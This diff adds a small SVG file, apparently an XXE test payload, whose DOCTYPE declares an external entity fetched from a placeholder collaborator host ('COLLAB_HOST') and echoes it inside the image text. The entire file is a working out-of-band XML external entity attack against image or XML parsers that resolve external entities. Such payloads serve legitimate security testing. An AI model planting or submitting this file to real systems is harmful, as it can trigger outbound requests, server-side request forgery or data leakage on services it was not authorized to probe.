@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "http://COLLAB_HOST/xxe-oob-general">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="400" height="60">
+  <text x="10" y="30" font-size="16">&xxe;</text>
+</svg>
